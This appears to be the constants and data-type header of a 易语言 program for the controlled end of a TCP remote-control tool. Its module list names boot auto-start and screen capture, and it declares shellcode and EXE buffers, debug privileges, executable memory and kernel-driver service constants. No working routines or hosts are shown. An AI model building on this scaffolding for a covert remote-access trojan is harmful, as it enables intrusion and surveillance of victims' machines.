 ' 文件类型：Windows窗口程序

 ' 程序名称：
 ' 程序描述：
 ' 程序作者：
 ' 邮政编码：
 ' 联系地址：
 ' 联系电话：
 ' 传真号码：
 ' 电子信箱：
 ' 主页地址：
 ' 版权声明：
 ' 版本号：1.0
 ' 创建号：0.0



.常量 WS_CHILD, "1073741824", , 
.常量 , , , 
.常量 CS_VREDRAW, "1", , 窗口宽度被改变重绘窗口
.常量 CS_HREDRAW, "2", , 窗口高度被改变重绘窗口
.常量 IDI_APPLICATION, "32512", , 系统默认的鼠标指针
.常量 COLOR_BTNFACE, "15", , 
.常量 CW_USEDEFAULT, "2147483648", , 默认位置
.常量 WS_CLIPCHILDREN, "33554432", , 在创建父窗口时使用这个风格。
.常量 WS_MAXIMIZEBOX, "65536", , 最大化按钮
.常量 WS_MINIMIZEBOX, "131072", , 最小化按钮
.常量 WS_VISIBLE, "268435456", , 可视
.常量 WS_SIZEBOX, "262144", , 可调边框
.常量 WS_CAPTION, "12582912", , 有标题和边框（包括WS_BODER风格）。
.常量 WS_SYSMENU, "524288", , 必须同时设定“窗口风格_标题栏”风格。
.常量 WM_CLOSE, "16", , 可否关闭
.常量 WM_DESTROY, "2", , 一个窗口正在被销毁
.常量 , , , 
.常量 , , , 
.常量 , , , 
.常量 GWL_WNDPROC, "-4", , 
.常量 , , , 
.常量 SW_HIDE, "0", , 
.常量 SW_SHOWNORMAL, "1", , 
.常量 SW_MINIMIZE, "6", , 
.常量 SW_MAXIMIZE, "3", , 
.常量 SW_SHOW, "5", , 
.常量 , , , 
.常量 CS_DBLCLKS, "8", , 
.常量 , , , 
.常量 IDC_ARROW, "32512", , 箭头
.常量 , , , 
.常量 窗口初始最大化, "16777216", , 
.常量 窗口单线边框, "8388608", , 
.常量 窗口对话框类型边框, "4194304", , 
.常量 窗口带垂直滚动条, "2097152", , 
.常量 窗口带水平滚动条, "1048576", , 
.常量 窗口初始可见, "268435456", , 
.常量 窗口初始禁止, "134217728", , 
.常量 窗口初始最小化, "536870912", , 
.常量 窗口有最大化按钮, "65536", , 
.常量 窗口有最小化按钮, "131072", , 
.常量 窗口普通折叠式窗口, "0", , 
.常量 窗口带系统菜单, "524288", , 
.常量 窗口可以拖动调大小, "262144", , 
.常量 窗口子窗口, "1073741824", , 
.常量 模块_主窗口, "1", , 
.常量 模块_次窗口, "0", , 
.常量 窗口扩展_总在顶层, "8", , 
.常量 窗口扩展_工具窗口, "128", , 
.常量 窗口扩展_充许拖动, "16", , 
.常量 窗口扩展_边框立体感, "256", , 
.常量 窗口扩展_客户立体感, "512", , 
.常量 , , , 
.常量 , , , 
.常量 WM_SIZE, "5", , 控件尺寸改变
.常量 WM_COMMAND, "273", , 当用户选择一条菜单命令项或当某个控件发送一条消息给它的父窗口，一个快捷键被翻译
.常量 WM_LBUTTONDBLCLK, "515", , //双击鼠标左键
.常量 WM_LBUTTONDOWN, "513", , //按下鼠标左键
.常量 WM_LBUTTONUP, "514", , //释放鼠标左键
.常量 WM_RBUTTONDBLCLK, "518", , //双击鼠标右键
.常量 WM_RBUTTONUP, "517", , //按下鼠标右键
.常量 WM_RBUTTONDOWN, "516", , //释放鼠标右键
.常量 WM_MOUSEMOVE, "512", , // 移动鼠标
.常量 WM_GETFONT, "49", , 应用程序发送此消息得到当前控件绘制文本的字体
.常量 WM_CREATE, "1", , 
.常量 WM_SHOWWINDOW, "24", , 
.常量 WM_ACTIVATEAPP, "28", , 
.常量 WM_NCACTIVATE, "134", , 
.常量 WM_SETFOCUS, "7", , 获取焦点
.常量 WM_KILLFOCUS, "8", , 失去焦点
.常量 WM_KEYDOWN, "256", , 按下某键
.常量 WM_KEYUP, "257", , 放开某键
.常量 WM_NOTIFY, "78", , 更多的消息
.常量 , , , 
.常量 EN_CHANGE, "768", , 事件_内容被改变
.常量 EN_CORRECTTEXT, "1797", , 
.常量 , , , 
.常量 , , , 
.常量 TVN_SELCHANGEDA, "-402", , 树型框 当前项目被改变
.常量 , , , 超级列表框\树型框
.常量 NM_CLICK, "-2", , 事件_被单击
.常量 NM_DBLCLK, "-3", , 事件_被双击
.常量 NM_RCLICK, "-5", , 事件_右键单击
.常量 NM_SETFOCUS, "-7", , 事件_获取焦点
.常量 , , , 
.常量 MF_DISABLED, "2", , 
.常量 , , , --工具条-----------------------------------
.常量 CCS_TOP, "1", , 
.常量 TBSTYLE_TOOLTIPS, "256", , TBSTYLE_TOOLTIPS
.常量 TBSTYLE_WRAPABLE, "512", , 
.常量 TBSTYLE_FLAT, "2048", , 
.常量 , , , 
.常量 TB_CHECKBUTTON, "1026", , 
.常量 TB_ENABLEBUTTON, "1025", , 
.常量 TB_PRESSBUTTON, "1027", , 
.常量 TB_ISBUTTONPRESSED, "1035", , 
.常量 TB_ISBUTTONENABLED, "1033", , 
.常量 TB_DELETEBUTTON, "1046", , 
.常量 TB_SETIMAGELIST, "1072", , 
.常量 工具条_标准按钮, "0", 公开, TBSTYLE_BUTTON
.常量 工具条_复选按钮, "2", 公开, TBSTYLE_CHECK
.常量 工具条_分隔线, "1", 公开, TBSTYLE_SEP
.常量 工具条_按钮允许, "4", 公开, TBSTATE_ENABLED
.常量 工具条_按下状态, "2", 公开, TBSTATE_PRESSED
.常量 工具条_下拉按钮, "128", 公开, TBSTYLE_EX_DOUBLEBUFFER
.常量 TBN_FIRST, "-700", , -----位图
.常量 , , , 
.常量 ILC_COLOR16, "16", , 
.常量 ILC_COLOR32, "32", , 
.常量 ILC_COLOR24, "24", , 
.常量 ILC_COLORDDB, "254", , 
.常量 LR_LOADMAP3DCOLORS, "4096", , 
.常量 LR_LOADFROMFILE, "16", , 
.常量 LR_LOADTRANSPARENT, "32", , 
.常量 , , , 
.常量 BS_PUSHBUTTON, "0", , 按钮
.常量 BS_DEFPUSHBUTTON, "1", , 默认
.常量 BS_AUTOCHECKBOX, "3", , 自动选择框
.常量 BS_AUTO3STATE, "6", , 自动3态选择框
.常量 BS_RADIOBUTTON, "4", , 
.常量 BS_AUTORADIOBUTTON, "9", , 自动单选框
.常量 BS_GROUPBOX, "7", , 
.常量 BS_RIGHT, "512", , 
.常量 BS_CENTER, "768", , 
.常量 BS_TOP, "1024", , 
.常量 BM_SETCHECK, "241", , 
.常量 BM_GETCHECK, "240", , 
.常量 BST_CHECKED, "1", , 
.常量 , , , 
.常量 WS_TABSTOP, "65536", , 
.常量 WS_GROUP, "131072", , 
.常量 WS_BORDER, "8388608", , 
.常量 WS_VSCROLL, "2097152", , 
.常量 编辑框_单行编辑框, "32", 公开, 
.常量 编辑框_多行编辑框, "33", 公开, 
.常量 组合框_可编辑组合框, "36", 公开, 
.常量 组合框_不可编辑组合框, "37", 公开, 
.常量 , , , 
.常量 标签_居中对齐, "20", 公开, 
.常量 标签_左对齐, "21", 公开, 
.常量 标签_右对齐, "22", 公开, 
.常量 , , , 
.常量 常用_普通按钮, "0", 公开, 
.常量 常用_默认按钮, "1", 公开, 
.常量 常用_自动复选框, "3", 公开, 
.常量 常用_自动3态复选框, "5", 公开, 
.常量 常用_自动单选钮, "7", 公开, 
.常量 常用_分组框, "8", 公开, 
.常量 , , , 
.常量 列表框_大图标列表, "0", 公开, 
.常量 列表框_小图标列表, "1", 公开, 
.常量 列表框_报表列表框, "2", 公开, 
.常量 列表框_普通列表框, "3", 公开, 
.常量 列表框_左端对齐, "1", 公开, 
.常量 列表框_顶端对齐, "0", 公开, 
.常量 普通列表框2, "4", , 
.常量 LV_VIEW_ICON, "0", , 大图标列表
.常量 LV_VIEW_DETAILS, "1", , 报表列表框
.常量 LV_VIEW_SMALLICON, "2", , 小图标列表
.常量 LV_VIEW_LIST, "3", , 普通列表框
.常量 LV_VIEW_MAX, "4", , 
.常量 LVS_REPORT, "1", , 报表列表框
.常量 LVCF_IMAGE, "16", , 
.常量 LVCF_TEXT, "4", , 
.常量 LVCF_WIDTH, "2", , 
.常量 LVIF_TEXT, "1", , 
.常量 LVIF_PARAM, "4", , 
.常量 LVIF_IMAGE, "2", , 
.常量 LVIF_STATE, "8", , 
.常量 LVIF_INDENT, "16", , 
.常量 LVIF_COLUMNS, "512", , 
.常量 LVIF_NORECOMPUTE, "2048", , 
.常量 LVIF_DI_SETITEM, "4096", , 
.常量 , , , 
.常量 LVM_FIRST, "4000", , 
.常量 LVM_DELETEALLITEMS, "4105", , 
.常量 LVM_DELETEITEM, "4104", , 
.常量 LVM_GETITEMCOUNT, "4100", , 
.常量 LVM_GETITEMTEXT, "4141", , 
.常量 LVM_GETNEXTITEM, "4108", , 
.常量 LVM_INSERTITEM, "4103", , 
.常量 LVM_SETITEM, "4102", , 
.常量 LVM_SETITEMTEXT, "4142", , 
.常量 LVM_INSERTCOLUMN, "4123", , 
.常量 LVM_DELETECOLUMN, "4124", , 删除列
.常量 LVM_INSERTITEMA, "4103", , 插入项目
.常量 LVM_SETIMAGELIST, "4099", , 
.常量 LVM_SETITEMSTATE, "4139", , 
.常量 LVM_SETVIEW, "4238", , 置列表框类型。
.常量 LVM_GETVIEW, "4239", , 取超级列表框当前的类型
.常量 LVIS_STATEIMAGEMASK, "-4096", , 
.常量 LVNI_FOCUSED, "1", , 
.常量 LVS_SHOWSELALWAYS, "8", , 
.常量 LVS_SINGLESEL, "4", , 
.常量 LVS_OWNERDATA, "4096", , 
.常量 LVS_SHAREIMAGELISTS, "64", , 
.常量 LVS_SORTASCENDING, "16", , 
.常量 LVS_TYPEMASK, "3", , 
.常量 LVS_EX_FULLROWSELECT, "32", , 
.常量 LVS_EX_GRIDLINES, "1", , 
.常量 LVS_EX_SINGLEROW, "262144", , 突出显示
.常量 LVS_EX_SNAPTOGRID, "524288", , 
.常量 LVS_EX_REGIONAL, "512", , 
.常量 LVS_EX_UNDERLINECOLD, "4096", , 
.常量 LVS_EX_MULTIWORKAREAS, "8192", , 隐藏标题
.常量 LVS_EX_ONECLICKACTIVATE, "64", , 
.常量 LVS_EX_UNDERLINEHOT, "2048", , 
.常量 LVS_EX_TWOCLICKACTIVATE, "128", , 
.常量 LVS_EX_SUBITEMIMAGES, "2", , 
.常量 LVS_EX_FLATSB, "256", , 
.常量 , , , 
.常量 TVS_HASBUTTONS, "1", , 
.常量 TVS_HASLINES, "2", , 
.常量 TVS_LINESATROOT, "4", , 
.常量 TVIF_TEXT, "1", , 
.常量 TVIF_PARAM, "4", , 
.常量 TVIF_IMAGE, "2", , 
.常量 TVGN_PARENT, "3", , 
.常量 TVGN_CARET, "9", , 
.常量 , , , 
.常量 TVM_GETCOUNT, "4357", , 
.常量 TVM_GETITEMA, "4364", , 
.常量 TVM_SETITEMA, "4365", , 
.常量 TVM_SETIMAGELIST, "4361", , 
.常量 TVM_SELECTITEM, "4363", , 
.常量 TVM_GETNEXTITEM, "4362", , 
.常量 TVM_INSERTITEMA, "4352", , 
.常量 , , , 
.常量 SS_CENTER, "1", , 
.常量 SS_LEFT, "0", , 
.常量 SS_RIGHT, "2", , 
.常量 SS_ICON, "3", , 
.常量 SS_BITMAP, "14", , 
.常量 SS_ETCHEDHORZ, "16", , 
.常量 SS_ETCHEDVERT, "17", , 
.常量 STM_SETIMAGE, "370", , 
.常量 , , , 
.常量 ES_LEFT, "0", , 
.常量 ES_WANTRETURN, "4096", , 
.常量 ES_NOHIDESEL, "256", , 
.常量 ES_AUTOHSCROLL, "128", , 
.常量 EM_SETREADONLY, "207", , 
.常量 ES_MULTILINE, "4", , 
.常量 ES_AUTOVSCROLL, "64", , 
.常量 , , , 
.常量 CBS_DROPDOWN, "2", , 
.常量 CBS_DROPDOWNLIST, "3", , 
.常量 CB_ADDSTRING, "323", , 
.常量 CB_INSERTSTRING, "330", , 
.常量 CB_DELETESTRING, "324", , 
.常量 CB_RESETCONTENT, "331", , 
.常量 CB_GETLBTEXT, "328", , 取组合框文本
.常量 CB_GETCOUNT, "326", , 
.常量 CB_GETLBTEXTLEN, "329", , 取组合框文本长度
.常量 CB_SETITEMDATA, "337", , 组合框置项目数值
.常量 CB_GETITEMDATA, "336", , 组合框置项目数值
.常量 CB_GETCURSEL, "327", , 获取组合框现行选中项
.常量 CB_SETCURSEL, "334", , 设置组合框现行选中项
.常量 , , , 
.常量 LBS_NOTIFY, "1", , 
.常量 LB_INSERTSTRING, "385", , 
.常量 LB_RESETCONTENT, "388", , 
.常量 LB_ADDSTRING, "384", , 方法_列表框加入项目
.常量 LB_SETITEMDATA, "410", , 方法_列表框置项目数值
.常量 LB_GETITEMDATA, "409", , 方法_列表框取项目数值
.常量 LB_DELETESTRING, "386", , 方法_列表框删除项目
.常量 LB_GETCURSEL, "392", , 方法_列表框到当前表项
.常量 LB_GETTEXT, "393", , 
.常量 LB_GETTEXTLEN, "394", , 方法_取列表项文本长度
.常量 lB_SETCURSEL, "390", , 方法_置现行选中项
.常量 LB_GETCOUNT, "395", , 方法_列表框取项目数
.常量 LBN_DBLCLK, "2", , 事件_列表框双击选择
.常量 LBN_SELCHANGE, "1", , 事件_列表框选择改变
.常量 CBN_SELCHANGE, "1", , 事件_组合框选择被改变
.常量 CBN_SELENDOK, "9", , 事件_组合框被选择
.常量 CBN_DROPDOWN, "7", , 事件_组合框被下拉
.常量 TTN_NEEDTEXT, "-520", , 
.常量 TB_AUTOSIZE, "1057", , 
.常量 LVM_SETEXTENDEDLISTVIEWSTYLE, "4150", , 
.常量 LVM_SETTEXTCOLOR, "4132", , 
.常量 LVM_SETBKCOLOR, "4097", , 
.常量 LVS_ICON, "0", , 
.常量 LVS_LIST, "3", , 
.常量 LVS_SMALLICON, "2", , 
.常量 GWL_STYLE, "-16", , 
.常量 TPM_LEFTALIGN, "0", , 
.常量 IMAGE_BITMAP, "0", , 
.常量 , , , 
.常量 , , , 
.常量 GB2312_CHARSET, "134", , 
.常量 WM_SETFONT, "48", , 
.常量 PBM_SETPOS, "1026", , 
.常量 PBM_SETRANGE, "1025", , 
.常量 LVS_EX_CHECKBOXES, "4", , 
.常量 LVS_EX_TRACKSELECT, "8", , 
.常量 LVM_GETITEMRECT, "4110", , 
.常量 SBARS_SIZEGRIP, "256", , 
.常量 SB_SETPARTS, "1028", , 
.常量 SB_SETTEXT, "1025", , 
.常量 SB_GETTEXT, "1026", , 
.常量 SB_GETTEXTLENGTH, "1027", , 
.常量 WM_PAINT, "15", , 
.常量 CBS_AUTOHSCROLL, "64", , 
.常量 WM_GETTEXT, "13", , 
.常量 CBN_SETFOCUS, "3", , 
.常量 CBN_KILLFOCUS, "4", , 
.常量 CBN_EDITUPDATE, "6", , 
.常量 LBN_SETFOCUS, "4", , 
.常量 LBN_KILLFOCUS, "5", , 
.常量 NM_KILLFOCUS, "-8", , 
.常量 TCIF_TEXT, "1", , 
.常量 TCM_INSERTITEMA, "4871", , 
.常量 TCM_GETITEMA, "4869", , 
.常量 TCM_GETCURSEL, "4875", , 
.常量 TCM_GETITEMCOUNT, "4868", , 
.常量 TCM_SETCURSEL, "4876", , 
.常量 TCM_SETITEMA, "4870", , 
.常量 TCIF_IMAGE, "2", , 
.常量 TCIF_RTLREADING, "4", , 
.常量 TCIF_PARAM, "8", , 
.常量 TCIF_STATE, "16", , 
.常量 TCN_SELCHANGE, "-551", , 
.常量 LVM_GETITEMSTATE, "4140", , 
.常量 外形_横线, "16", 公开, 
.常量 外形_坚线, "17", 公开, 
.常量 外形_灰色矩形, "5", , SS_GRAYRECT
.常量 外形_白色矩形, "6", , SS_WHITERECT
.常量 外形_黑边框矩形, "7", 公开, SS_BLACKFRAME
.常量 外形_灰边框矩形, "8", 公开, SS_GRAYFRAME
.常量 外形_白边框矩形, "9", 公开, SS_WHITEFRAME
.常量 外形_立体矩形, "18", 公开, SS_ETCHEDFRAME
.常量 , , , 
.常量 SS_GRAYRECT, "5", , 
.常量 SS_WHITERECT, "6", , 
.常量 LVM_GETEXTENDEDLISTVIEWSTYLE, "4151", , 
.常量 LVM_FINDITEMA, "4109", , 
.常量 列表框_近似查找, "8", 公开, LVFI_PARTIAL
.常量 列表框_全匹配查找, "2", 公开, LVFI_STRING
.常量 WM_CTLCOLORSTATIC, "312", , 
.常量 WM_CTLCOLORBTN, "309", , 
.常量 WM_CTLCOLOREDIT, "307", , 
.常量 WM_CTLCOLORLISTBOX, "308", , 
.常量 TVM_SETBKCOLOR, "4381", , 
.常量 TVM_SETTEXTCOLOR, "4382", , 
.常量 LVM_SETTEXTBKCOLOR, "4134", , 
.常量 TB_ADDBITMAP, "1043", , 
.常量 TB_SETBITMAPSIZE, "1056", , 
.常量 TB_SETBUTTONSIZE, "1055", , 
.常量 TB_BUTTONSTRUCTSIZE, "1054", , 
.常量 TB_ADDBUTTONS, "1044", , 
.常量 TCN_SELCHANGING, "-552", , 
.常量 , , , 
.常量 选择夹_多行, "512", , TCS_MULTILINE
.常量 选择夹_左边, "128", 公开, TCS_VERTICAL
.常量 选择夹_底边, "2", 公开, TCS_RIGHT
.常量 , , , 
.常量 TCS_BUTTONS, "256", , 
.常量 TCS_FIXEDWIDTH, "1024", , 
.常量 超级_范围_选中范围, "3", 公开, LVIR_SELECTBOUNDS
.常量 超级_范围_标题范围, "2", 公开, LVIR_LABEL
.常量 超级_范围_图标范围, "1", 公开, LVIR_ICON
.常量 超级_范围_整个项目, "0", 公开, LVIR_BOUNDS
.常量 LVM_GETITEMPOSITION, "4112", , 
.常量 LVM_SETITEMPOSITION, "4111", , 
.常量 LVM_GETCOLUMN, "4121", , 
.常量 LVM_GETCOLUMNWIDTH, "4125", , 
.常量 LVM_SETCOLUMNWIDTH, "4126", , 
.常量 LVM_SUBITEMHITTEST, "4153", , 
.常量 LVM_GETSUBITEMRECT, "4152", , 
.常量 BN_SETFOCUS, "6", , 
.常量 BN_KILLFOCUS, "7", , 
.常量 BN_CLICKED, "0", , 
.常量 CBN_CLOSEUP, "8", , 
.常量 LBN_SELCANCEL, "3", , 
.常量 LVN_COLUMNCLICK, "-108", , 
.常量 LVN_BEGINDRAG, "-109", , 
.常量 LVN_BEGINLABELEDITA, "-105", , 
.常量 LVN_ENDLABELEDITA, "-106", , 
.常量 LVN_MARQUEEBEGIN, "-156", , 
.常量 LVN_HOTTRACK, "-121", , 
.常量 LVS_EDITLABELS, "512", , 
.常量 SS_NOTIFY, "256", , 
.常量 STN_DBLCLK, "1", , 
.常量 STN_DISABLE, "3", , 
.常量 STN_ENABLE, "2", , 
.常量 NM_RETURN, "-4", , 
.常量 LVS_ALIGNLEFT, "2048", , 
.常量 , , , 
.常量 , , , 
.图片 动态调用代码, " ' 已保存到：D:\易语言学习\Data\TCP被控端.e\动态调用代码", 公开, 
.常量 SC_MANAGER_ENUMERATE_SERVICE, "4", , 
.常量 SERVICE_WIN32, "48", , 
.常量 SERVICE_STATE_ALL, "3", , 
.常量 HKEY_CLASSES_ROOT, "-2147483648", , 
.常量 HKEY_CURRENT_CONFIG, "-2147483643", , 
.常量 HKEY_CURRENT_USER, "-2147483647", , 
.常量 HKEY_DYN_DATA, "-2147483642", , 
.常量 HKEY_LOCAL_MACHINE, "-2147483646", , 
.常量 HKEY_USERS, "-2147483645", , 
.常量 HKEY_PERFORMANCE_DATA, "-2147483644", , 
.常量 , , , 
.常量 驱动器类型_可移动磁盘, "2", 公开, 
.常量 驱动器类型_本地磁盘, "3", 公开, 
.常量 驱动器类型_网络驱动器, "4", 公开, 
.常量 驱动器类型_光盘驱动器, "5", 公开, 
.常量 驱动器类型_虚拟磁盘, "6", 公开, 
.常量 , , , 
.常量 OF_READ, "0", 公开, 以只读方式打开文件
.常量 OF_SHARE_COMPAT, "0", 公开, 文件可由多个应用程序打开多次
.常量 OF_WRITE, "1", 公开, 文件以只写模式打开
.常量 OF_READWRITE, "2", 公开, 以可读、可写的方式打开文件
.常量 OPEN_ALWAYS, "4", 公开, 
.常量 匿名常量_5780, "8", , 
.常量 OF_SHARE_EXCLUSIVE, "16", 公开, 其他任何一个程序都不能再打开这个文件
.常量 OF_SHARE_DENY_WRITE, "32", 公开, 其他程序可以读文件，但不能写文件
.常量 OF_SHARE_DENY_READ, "48", 公开, 禁止其他程序读写文件内容
.常量 OF_SHARE_DENY_NONE, "64", 公开, 可打开文件，以便由其他程序读写
.常量 OF_PARSE, "256", 公开, 填写lpReOpenBuff结构的内容，但不执行其他任何操作
.常量 OF_DELETE, "512", 公开, 删除指定的文件
.常量 , , , 
.常量 OF_CREATE, "4096", 公开, 创建指定的文件。如已经存在，则将其缩减为零长度
.常量 OF_PROMPT, "8192", 公开, 如文件不存在，则显示一个消息框，在其中列出重试和取消按钮
.常量 OF_EXIST, "16384", 公开, 通过尝试打开文件的做法，判断一个文件是否存在。如文件存在，则将其关闭。
.常量 OF_REOPEN, "32768", 公开, 打开lpReOpenBuff结构内指定的文件，而不是用lpFileName参数
.常量 FORMAT_MESSAGE_FROM_SYSTEM, "4096", , 
.常量 FORMAT_MESSAGE_ARGUMENT_ARRAY, "8192", , 
.常量 GENERIC_READ, "2147483648", , ""
.常量 GENERIC_WRITE, "1073741824", , ""
.常量 FILE_SHARE_READ, "1", , ""
.常量 FILE_SHARE_WRITE, "2", , ""
.常量 OPEN_EXISTING, "3", , 
.常量 FILE_ATTRIBUTE_NORMAL, "128", , ""
.常量 CREATE_ALWAYS, "2", , 
.常量 FILE_CURRENT, "1", , 
.常量 FILE_BEGIN, "0", , 
.常量 FILE_END, "2", , 
.常量 FILE_FLAG_DELETE_ON_CLOSE, "67108864", , ""
.常量 PAGE_READONLY, "2", , ""
.常量 PAGE_READWRITE, "4", , ""
.常量 PAGE_WRITECOPY, "8", , ""
.常量 FILE_MAP_WRITE, "2", , 
.常量 FILE_MAP_READ, "4", , 
.常量 FILE_MAP_ALL_ACCESS, "983071", , 
.常量 , , , 
.常量 , , , 
.常量 进制参数, "“0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz”", 公开, 
.常量 , , , 
.常量 , , , 
.常量 STARTF_USESHOWWINDOW, "1", , 
.常量 SW_NORMAL, "1", 公开, 同 SW_SHOWNORMAL
.常量 SW_SHOWMINIMIZED, "2", 公开, 最小化,激活
.常量 SW_SHOWMAXIMIZED, "3", 公开, 最大化,激活
.常量 SW_SHOWNOACTIVATE, "4", 公开, 用最近的大小和位置显示,不激活
.常量 SW_SHOWMINNOACTIVE, "7", 公开, 同 SW_MINIMIZE
.常量 SW_SHOWNA, "8", 公开, 同 SW_SHOWNOACTIVATE
.常量 SW_RESTORE, "9", 公开, 同 SW_SHOWNORMAL
.常量 SW_SHOWDEFAULT, "10", 公开, 同 SW_SHOWNORMAL
.常量 SW_MAX, "10", 公开, 同 SW_SHOWNORMAL
.常量 PROCESS_ALL_ACCESS, "2035711", 公开, 0x01F0FFF
.常量 INFINITE, "-1", 公开, 4294967295
.常量 , , , 
.常量 备份, "“SeBackupPrivilege”", 公开, 
.常量 启动, "“SeRestorePrivilege”", 公开, 
.常量 关机, "“SeShutdownPrivilege”", 公开, 
.常量 调试, "“SeDebugPrivilege”", 公开, 
.常量 , , , 
.常量 WM_MOVING, "534", , 
.常量 , , , 
.常量 , , , 
.常量 PAGE_EXECUTE_READWRITE, "64", , 
.常量 PAGE_EXECUTE_READ, "32", 公开, 
.常量 , , , 
.常量 , , , 
.常量 , , , 
.常量 SC_MANAGER_CREATE_SERVICE, "2", 公开, 
.常量 SERVICE_START, "16", 公开, 
.常量 SERVICE_ERROR_IGNORE, "0", 公开, 
.常量 DELETE, "65536", 公开, 
.常量 SERVICE_STOP, "32", 公开, 
.常量 SERVICE_CONTROL_STOP, "1", 公开, 
.常量 SERVICE_KERNEL_DRIVER, "1", 公开, 
.常量 SERVICE_DEMAND_START, "3", 公开, 
.常量 , , , 
.常量 , , , 
.常量 WS_EX_TRANSPARENT, "32", 公开, 
.常量 GWL_EXSTYLE, "-20", 公开, 
.常量 , , , 
.常量 , , , 
.常量 , , , 
.常量 SM_CXFULLSCREEN, "16", 公开, 
.常量 SM_CYFULLSCREEN, "17", 公开, 
.常量 SM_CXSCREEN, "0", 公开, 
.常量 SM_CYSCREEN, "1", 公开, 
.常量 , , , 
.常量 AF_INET, "2", , 
.常量 SOCK_STREAM, "1", , 
.常量 IPPROTO_TCP, "6", , 
.常量 WSA_FLAG_OVERLAPPED, "1", , 
.常量 SOMAXCONN, "2147483647", , 
.常量 WSA_IO_PENDING, "997", , 
.常量 SOCKET_ERROR, "-1", , 
.常量 WSA_WAIT_TIMEOUT, "258", , 
.常量 INVALID_SOCKET, "0", , 
.常量 Recv, "1", , 
.常量 Send, "2", , 
.常量 HEAP_GENERATE_EXCEPTIONS, "4", , 
.常量 HEAP_ZERO_MEMORY, "8", , 
.常量 数据到达, "1", 公开, 
.常量 连接断开, "2", 公开, 
.常量 STILL_ACTIVE, "259", , 
.常量 退出线程, "-1", , 
.常量 MEM_COMMIT, "4096", , 
.常量 MEM_RESERVE, "8192", , 
.常量 MEM_RELEASE, "32768", , 
.常量 , , , 
.常量 数字锁定键盘灯, "0", , 
.常量 大小写锁定键盘灯, "1", , 
.常量 滚动锁定键盘灯, "2", , 
.常量 分割符, "“|\”", , 


 ' 所需要的支持库：
 ' krnln d09f2340818511d396f6aaf844c7e325 4 6 系统核心支持库



 ' 所需要的模块
 ' 截取窗口位图 C:\Documents and Settings\Administrator\桌面\截取窗口位图.ec
 ' 压缩数据_ C:\Documents and Settings\Administrator\桌面\TCP远控\压缩数据_.ec
 ' 开机启动 C:\Documents and Settings\Administrator\桌面\TCP远控(压缩数据_)\开机启动.ec
 ' 屏幕差异数据获取模块 C:\Documents and Settings\Administrator\桌面\TCP远控(配置项)\差异屏幕模块.ec
 ' 斩月_图像相关模块 C:\Documents and Settings\Administrator\桌面\斩月_图像相关模块.ec
 ' 取变量指针模块 C:\Documents and Settings\Administrator\桌面\2008\取变量指针模块.ec
 ' 传送客户 C:\Documents and Settings\Administrator\桌面\2008\传输客户模块.ec


数据类型 运行的数据类型, , 
    .成员 EXE, 字节集, , , 
    .成员 shellcode, 字节集, , , 

数据类型 矩形范围, 公开, 
    .成员 矩形左边, 整数型, , , 
    .成员 矩形顶边, 整数型, , , 
    .成员 矩形宽度, 整数型, , , 
    .成员 矩形高度, 整数型, , , 

数据类型 LVITEM, , LVITEM,超级列表框表格行结构
    .成员 mask, 整数型, , , 掩码
    .成员 iItem, 整数型, , , 项目
    .成员 iSubItem, 整数型, , , 子项目
    .成员 state, 整数型, , , 状态,检查框状态
    .成员 stateMask, 整数型, , , 状态掩码
    .成员 pszText, 整数型, , , 项目文本
    .成员 cchTextMax, 整数型, , , 项目文本长度
    .成员 iImage, 整数型, , , 图片索引
    .成员 lParam, 整数型, , , 项目数值
    .成员 iIndent, 整数型, , , 缩进

数据类型 NMLVDISPINFO, , 超级列表框事件结构
    .成员 hdr, NMHDR, , , 
    .成员 iItem, LVITEM, , , 

数据类型 POINTAPI, , 点结构
    .成员 横向位置, 整数型, , , 
    .成员 纵向位置, 整数型, , , 

数据类型 NMLISTVIEW, , 超级列表框表头被单击结构
    .成员 hdr, NMHDR, , , 
    .成员 iItem, 整数型, , , 
    .成员 iSubItem, 整数型, , , 
    .成员 uNewState, 整数型, , , 
    .成员 uOldState, 整数型, , , 
    .成员 uChanged, 整数型, , , 
    .成员 ptAction, POINTAPI, , , 
    .成员 lParam, 整数型, , , 

数据类型 TOOLTIPTEXT, , 工具条提示信息
    .成员 HDR, NMHDR, , , 
    .成员 LpszText, 整数型, , , 提示字符串指针
    .成员 szText, 字节型, , , 提示缓冲区
    .成员 hInst, 整数型, , , 字符串资源模块句柄
    .成员 uFlags, 整数型, , , 字符串标志

数据类型 NMHDR, , 通用控件发送消息lParam指向的结构
    .成员 hwndFrom, 整数型, , , 通用控件句柄
    .成员 idfrom, 整数型, , , 控件ID
    .成员 code, 整数型, , , 通知码

数据类型 超类颜色, , 
    .成员 控件句柄, 整数型, , , 
    .成员 颜色值, 整数型, , , 

数据类型 超类窗口, , 
    .成员 按钮类, 整数型, , , 
    .成员 静态类, 整数型, , , 
    .成员 工具栏, 整数型, , , 

数据类型 状态句柄, , 
    .成员 父窗口, 整数型, , , 
    .成员 工具条句柄, 整数型, , , 
    .成员 状态条句柄, 整数型, , , 

数据类型 控件颜色, , 
    .成员 背景色, 整数型, , , 
    .成员 前景色, 整数型, , , 

数据类型 控件事件, , 
    .成员 控件ID, 整数型, , , 
    .成员 控件句柄, 整数型, , , 
    .成员 原窗口过程, 整数型, , , 
    .成员 工具条提示, 整数型, , , 字符指针
    .成员 匿名成员7672, 空白型, , , 
    .成员 被双击, 子程序指针, , , 
    .成员 获取焦点, 子程序指针, , , 
    .成员 失去焦点, 子程序指针, , , 
    .成员 字符输入, 子程序指针, , , 
    .成员 按下某键, 子程序指针, , , 
    .成员 鼠标右键被按下, 子程序指针, , , 
    .成员 项目被选择, 子程序指针, , , 
    .成员 取消选择, 子程序指针, , , 
    .成员 即将改变, 子程序指针, , , 
    .成员 被改变, 子程序指针, , , 
    .成员 按下回车键, 子程序指针, , , 
    .成员 被禁用, 子程序指针, , , 
    .成员 被启用, 子程序指针, , , 
    .成员 匿名成员7686, 空白型, , , 
    .成员 弹出列表, 子程序指针, , , 
    .成员 关闭列表, 子程序指针, , , 
    .成员 表头被单击, 子程序指针, , , 
    .成员 被拖动, 子程序指针, , , 
    .成员 开始编辑, 子程序指针, , , 
    .成员 结束编辑, 子程序指针, , , 
    .成员 开始选择, 子程序指针, , , 
    .成员 自动选择, 子程序指针, , , 
    .成员 匿名成员7695, 空白型, , , 
    .成员 匿名成员7696, 空白型, , , 
    .成员 被单击, 子程序指针, , , 
    .成员 内容被改变, 子程序指针, , , 
    .成员 置控件颜色, 控件颜色, , , 

数据类型 窗口事件_, , 
    .成员 窗口句柄, 整数型, , , 
    .成员 匿名成员7633, 空白型, , , 
